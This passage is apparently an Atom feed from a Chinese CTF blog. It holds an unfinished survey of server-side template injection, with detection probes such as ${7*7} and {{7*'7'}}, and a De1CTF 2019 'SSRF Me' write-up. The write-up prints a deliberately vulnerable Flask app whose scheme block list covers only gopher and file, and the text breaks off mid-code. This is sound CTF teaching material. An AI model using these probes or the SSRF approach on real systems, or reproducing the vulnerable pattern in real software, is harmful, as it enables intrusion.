        <content type="html"><![CDATA[<h1 id="SSTI模板注入汇总"><a href="#SSTI模板注入汇总" class="headerlink" title="SSTI模板注入汇总"></a>SSTI模板注入汇总</h1><p>参考<a href="https://zhuanlan.zhihu.com/p/28823933">服务端模板注入攻击</a><br>之前做了很多SSTI模板注入的题目，但是做起题来还是云里雾里，打算做个小汇总。</p><h2 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h2><p>漏洞一般出现在这两种情况下，而每种有不同的探测手法：</p><h3 id="文本类"><a href="#文本类" class="headerlink" title="文本类"></a>文本类</h3><p>大部分的模板语言支持我们输入 HTML，比如：</p><pre class=" language-1"><code class="language-1">smarty=Hello {user.name}Hello user1 freemarker=Hello ${username}Hello newuser any=<b>Hello</b><b>Hello<b></code></pre><p>未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。除此之外，模板语言的语法和 HTML 语法相差甚大，因此我们可以用其独特的语法来探测漏洞。虽然各种模板的实现细节不大一样，不过它们的基本语法大致相同，我们可以发送如下 payload：</p><pre class=" language-1"><code class="language-1">smarty=Hello ${7*7}Hello 49 freemarker=Hello ${7*7}Hello 49</code></pre><p>来确认漏洞。</p><h3 id="代码类"><a href="#代码类" class="headerlink" title="代码类"></a>代码类</h3><p>在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名：</p><pre class=" language-1"><code class="language-1">personal_greeting=usernameHello user01</code></pre><p>这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：</p><pre class=" language-1"><code class="language-1">personal_greeting=username<tag>Hellopersonal_greeting=username} }<tag>Hello user01 <tag></code></pre><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p>检测到模板注入后，我们需要判断具体的模板引擎。我们需要 fuzz 不同的字符，再通过返回的错误判断。当模板引擎屏蔽错误后，该类当法就失效了，并且暴力 fuzz 也对攻击自动化不友好。Burpsuite 则对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：<br><img src="https://pic3.zhimg.com/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg?source=172ae18b"><br>有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说{ {7*'7'} }会在 Twig 中返回49，而在 Jinja2 中则是7777777。</p><h2 id="常见的模板及其payload"><a href="#常见的模板及其payload" class="headerlink" title="常见的模板及其payload"></a>常见的模板及其payload</h2><h3 id="TWIG"><a href="#TWIG" class="headerlink" title="TWIG"></a>TWIG</h3><p><a href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本 通用 SSTI payload</a></p><h3 id="Jimja2"><a href="#Jimja2" class="headerlink" title="Jimja2"></a>Jimja2</h3><p>待填坑</p><h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><p><a href="http://kingkb.top/2022/01/18/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABweb-flask%E5%A4%8D%E7%8E%B0/">http://kingkb.top/2022/01/18/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABweb-flask%E5%A4%8D%E7%8E%B0/</a></p><h3 id="Mako"><a href="#Mako" class="headerlink" title="Mako"></a>Mako</h3><p>待填坑</p><h3 id="Jade"><a href="#Jade" class="headerlink" title="Jade"></a>Jade</h3><p>待填坑</p><h3 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h3><p>待填坑</p><h3 id="Freemaker"><a href="#Freemaker" class="headerlink" title="Freemaker"></a>Freemaker</h3><p>待填坑</p><h3 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h3><p>待填坑</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF 2019 SSRF Me 1题解</title>
      <link href="/2022/04/20/De1CTF%202019%20SSRF%20Me%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/04/20/De1CTF%202019%20SSRF%20Me%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="De1CTF-2019-SSRF-Me-1题解"><a href="#De1CTF-2019-SSRF-Me-1题解" class="headerlink" title="De1CTF 2019 SSRF Me 1题解"></a>De1CTF 2019 SSRF Me 1题解</h1><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目，有hint:flag在flag.txt中</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python </span><span class="token comment" spellcheck="true">#encoding=utf-8 </span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask <span class="token keyword">from</span> flask <span class="token keyword">import</span> request <span class="token keyword">import</span> socket <span class="token keyword">import</span> hashlib <span class="token keyword">import</span> urllib <span class="token keyword">import</span> sys <span class="token keyword">import</span> os <span class="token keyword">import</span> json reload<span class="token punctuation">(</span>sys<span class="token punctuation">)</span> sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span> app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>     <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>         self<span class="token punctuation">.</span>action <span class="token operator">=</span> action         self<span class="token punctuation">.</span>param <span class="token operator">=</span> param         self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign         self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token comment" spellcheck="true">#SandBox For Remote_Addr </span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>         result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                 tmpfile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                     result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                 <span class="token keyword">else</span><span class="token punctuation">:</span>                     <span class="token keyword">print</span> resp                 tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                 tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                 result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>             <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                 f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                 result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                 result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>             <span class="token keyword">else</span><span class="token punctuation">:</span>                 result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>                 result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>             <span class="token keyword">return</span> result     <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> <span class="token boolean">True</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token comment" spellcheck="true">#generate Sign For Action Scan. </span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     action <span class="token operator">=</span> <span class="token string">"scan"</span>     <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span> @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr     <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>     task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>     <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>     socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token keyword">try</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>     <span class="token keyword">except</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span> <span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>     check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token operator">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>     app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span> app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span> </code></pre><p>分析函数，geneSign是对传入的param与其他字符串拼接并返回其md5值</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     action <span class="token operator">=</span> <span class="token string">"scan"</span>     <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>De1ta是主要，传入3个参数，以及ip，先判断param是否是gopher或者file开头的参数，不是则过到Task中，并且返回task的Exec()函数结果，</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr     <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>     task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>     <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>     check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token operator">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token boolean">False</span> </code></pre><p>最后看task类</p><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>     <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>         self<span class="token punctuation">.</span>action <span class="token operator">=</span> action         self<span class="token punctuation">.</span>param <span class="token operator">=</span> param         self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign         self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token comment" spellcheck="true">#SandBox For Remote_Addr </span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>         result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                 tmpfile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                     result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                 <span class="token keyword">else</span><span class="token punctuation">:</span>                     <span class="token keyword">print</span> resp                 tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                 tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                 result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>             <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                 f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                 result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                 result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>             <span class="token keyword">else</span><span class="token punctuation">:</span>                 result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>                 result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>             <span class="token keyword">return</span> result     <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> <span class="token boolean">True</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> <span class="token boolean">False</span> </code></pre><p>__init__方法进行了最初始的赋值，同时对ip进行md5加密后的路径进行检测，如果存在则进入。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>action <span class="token operator">=</span> action     self<span class="token punctuation">.</span>param <span class="token operator">=</span> param     self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign     self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment" spellcheck="true">#SandBox For Remote_Addr </span>        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span> </code></pre><p>checkSign判断sign的正确性。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token boolean">True</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> </code></pre><p>exec则是先检测sign，然后判断action，如果是scan会进行查询并写入，如果是read会读取。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>     result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>             tmpfile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                 result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp             <span class="token keyword">else</span><span class="token punctuation">:</span>                 <span class="token keyword">print</span> resp             tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>             tmpfile<span class="token punctuation">.</span>close<span class="token 